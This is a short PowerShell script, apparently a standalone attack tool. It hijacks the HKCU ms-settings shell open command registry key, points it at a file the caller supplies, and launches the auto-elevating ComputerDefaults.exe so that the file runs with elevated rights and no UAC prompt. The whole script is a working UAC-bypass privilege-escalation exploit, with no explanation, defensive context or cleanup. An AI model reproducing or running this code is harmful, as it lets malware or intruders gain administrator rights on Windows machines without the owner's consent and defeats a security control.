param (
        [string]$currentDirectory,
        [string]$fileName
    )

$fullPath = Join-Path -Path $currentDirectory -ChildPath $fileName

New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "$fullPath" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"